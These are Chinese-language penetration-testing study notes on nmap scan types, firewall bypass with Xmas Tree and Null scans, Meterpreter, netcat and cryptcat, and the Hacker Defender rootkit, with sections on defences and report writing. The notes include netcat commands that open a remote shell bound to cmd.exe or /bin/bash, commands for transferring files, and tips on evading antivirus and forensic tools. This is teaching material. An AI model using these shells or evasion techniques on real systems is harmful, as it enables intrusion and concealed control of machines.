端口扫描

TCP

SYN -> SYN/ACK -> ACK

ping 扫描

  • fping (kali)

nmap

  • -s 默认扫描（SYN）==> -sS（快速）
  • -sT
  • -Pn
  • -p-
  • -iL list.txt
  • -sS/-s
  • 不进行UDP扫描就像读书只看导论
    • -sU
    • 速度慢
    • 了解那些服务是基于 UDP 的
    • 这些服务是不是被放到了单独的主机上
    • 当发现结果几乎全是 open|filterd时，加上 -sV 参数，用于版本扫描，可以二次精确 UDP 的扫描结果，将更改部分 open|filterd 为 open，结合起来就是 -sUV
  • Xmas Tree 扫描
    • 在 TCP 的 RFC 文档中有如下描述：
      • 当发送不带 SYN/ACK/RST 的包给一个关闭的端口时，端口必须回复一个 RST
      • 当发送不带 SYN/ACK/RST 的包给一个打开的端口时，端口忽略这个包
    • 构造 FIN/PSH/URG 标志位打开（SYN/ACK/RST关闭）的数据包，查看服务器反应
    • 前提：目标计算机遵循 RFC 文档实现协议栈
    • 作用范围：Unix 和 Linux 主机，对 Windows 几乎不起作用
    • 使用：nmap -sX -p- -Pn 1.1.1.1
  • Null 扫描
    • 同上，也是发送不规则数据包，且对 Windows 无效果
    • 原理：发送没有任何标记的数据包，且目标系统回复同XmasTree扫描一致
    • 和 Xmas Tree 扫描都可以绕过一些简单的过滤器和 ACL，他们俩一般只能判断端口开关状态，不会建立任何通信
    • 使用：nmap -sN -p- -Pn 1.1.1.1
  • -T 调节扫描速度
    • 0～5: 5 最快，避免被检测时就要减速，使用 5 时扫描很快，结果不全
  • -sV 同时探测服务版本
  • -O 探测操作系统（需要root）

防火墙原理：

参考这些默认的 iptables 规则：

像第一条：只接受已建立连接的或与已建立连接有关联的数据包进入，大致原理是：丢弃任何一个以 SYN 数据包开始的外部通信！这个就很容易被 Xmas Tree 扫描和 Null 扫描绕过。

当使用 XmasTree 和 Null 扫描时依然能在特殊情况下得到端口开放结果！

一个专家的扫描顺序

SYN - TCP - UDP - Xmas Tree - Null 不到最后不能确定结果。

入侵 Windows 时常用的载荷:

Meterpreter 这个工具是 Metasploit 艺术重要的一环，其特点是完全在内存中运行，提高了隐蔽性，且不易被杀软查杀，也可以迷惑某些取证工具。

为什么使用 Meterpreter 而不使用 cmd/shell？
1. 使用后者会启动新进程，隐蔽性降低
2. 后者提供了有限的工具和命令，而 Meterpreter 则好比定制版，多数工具都可以使用

Meterpreter 有个服务器端，当被你攻陷的这个服务/进程被管理员关闭时，可以用自带的 migrate 命令将服务器迁移至另外的进程。

Netcat

Win 上反弹shell:（Win 上的 -L 用于建立持久连接）

netcat -L -p 1234 -e c:\Windows\System32\cmd.exe

以及 上传文件：

netcat -L -p 1234 > calc.exe

Linux 上反弹shell：

netcat -l -p 1234 -e /bin/bash

以及上传文件：

netcat -l -p 1234 > file.sh

客户端使用：

netcat 1.1.1.1 1234 < calc.exe 上传文件

客户端盲连接（在nmap类软件无法识别一个自定义端口时进行试探）

netcat 1.1.1.1 50001 //并发送任意内容，通过返回内容判断 50001 的服务

使用 meterpreter 上传 nc 至目标

Cryptcat

netcat 流量是明文的，而cryptcat是加密的（使用了 twofish算法）
默认的key值是metallica，你应当使用-k选项更改这个值，否则任何人都能破解你的会话（session）

使用：

cryptcat -l -p 1234

客户端：

cryptcat 1.1.1.1 1234

rootkit

可以隐藏文件、进程、程序，如同他们从未安装过，躲过杀毒软件查杀哦。渗透测试时需要再三确认客户是否已经明确授权可以使用 rootkit。

  • 提升权限
  • 记录键盘
  • 安装后门等
  • 在操作系统内核运行，可以阻塞（hooking）或者拦截软件与操作系统间的各种请求
  • 一般用于隐藏文件或木马程序，并保持后门访问的隐蔽性

ME: 这是一个非常危险的东西！！！

这是一个很深的“兔子洞”：
1. 对操作系统内核要有扎实的理解
2. 内容值得专著一本书
3. 恶意软件之一

Hacker Defender 出乎你的想象

是一个 rookie，攻击手段，而不是防御手段！

包含文件：

  • hxdef100.exe===>服务端软件，即后门
  • hxdef100.ini===>配置文件
  • bdcli100.exe===>客户端软件，用于连接后门

rootkit 的检测和防御

一般的防御设置：

  • 密切监控你放到互联网上的信息
  • 正确配置防火墙和ACL
  • 及时为系统打补丁
  • 安装并使用杀毒软件
  • 使用入侵检测系统

额外的防rootkit设置：

  • 降低用户权限，用户不应在管理员组
  • 最新的杀软还是能检测一些过时的rootkit的
  • 检测所在网络的进出（IN/OUT）流量
  • 定期对自己的系统进行端口扫描（每次记录并复查，是否开启了未知的端口）
  • 使用 rootkit 发现工具
    • Rootkit Revealer
    • vice
    • F-Secure
    • Blacklight
  • 一般 rootkit 很难删除，可能需要挂接硬盘到其他设备或进入另外的操作系统，或者完全格式化重装

总结

编写测试报告

最容易被忽略的部分。

要包含的部分：

  • 综合报告 （概述，非技术术语，影响，到达详细报告的引用，简短）
  • 详细报告 （技术，漏洞分级，最严重结果置前，截图证明，缓解措施）
  • 原始数据

报告的机密性：使用7Zip对文件压缩并加密，或者使用TrueCrypt进行加密
